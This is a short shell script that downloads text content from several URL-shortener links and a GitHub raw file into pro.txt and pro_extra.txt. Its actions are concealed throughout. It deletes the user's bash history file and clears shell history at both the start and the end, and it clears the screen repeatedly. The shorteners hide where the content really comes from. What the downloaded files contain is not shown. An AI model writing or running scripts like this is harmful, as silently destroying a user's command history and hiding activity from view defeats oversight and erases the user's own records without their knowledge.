#!/bin/sh
clear

# Remove bash history
rm -f ~/.bash_history && history -c && unset HISTFILE
clear

download_success=false
output_file="pro.txt"

# Function to try a download using wget or curl
download_file() {
    url="$1"
    # Try wget first; if not use curl
    if wget -qO - "$url" >> "$output_file" 2>/dev/null || curl -fsSL "$url" >> "$output_file" 2>/dev/null; then
        download_success=true
        clear
    fi
}

# List of primary URLs for the main file download
primary_urls="https://naturl.link/se19pro https://v.gd/se19pro https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt"
clear

# Check if either wget or curl is available before trying
if command -v wget > /dev/null 2>&1 || command -v curl > /dev/null 2>&1; then
    for url in $primary_urls; do
        download_file "$url"
        if [ "$download_success" = true ]; then
            break
        fi
    done
else
    echo "Neither wget nor curl is installed. Cannot download the main file."
    exit 1
fi

if [ "$download_success" = true ]; then
    echo "Main download executed successfully!"
else
    echo "Looks like there is no internet or the main command failed to execute."
fi

# Now download the extra URL separately into a separate file
extra_output_file="pro_extra.txt"
extra_url="https://naturl.link/seprog1"
if command -v wget > /dev/null 2>&1 || command -v curl > /dev/null 2>&1; then
    if wget -qO - "$extra_url" >> "$extra_output_file" 2>/dev/null || curl -fsSL "$extra_url" >> "$extra_output_file" 2>/dev/null; then
        echo "Extra download from $extra_url executed successfully!"
    else
        echo "Extra download from $extra_url failed."
    fi
else
    echo "Neither wget nor curl is installed. Cannot download the extra file."
fi

clear

# Remove command history again for good measure
rm -f ~/.bash_history && history -c && unset HISTFILE
clear
exit
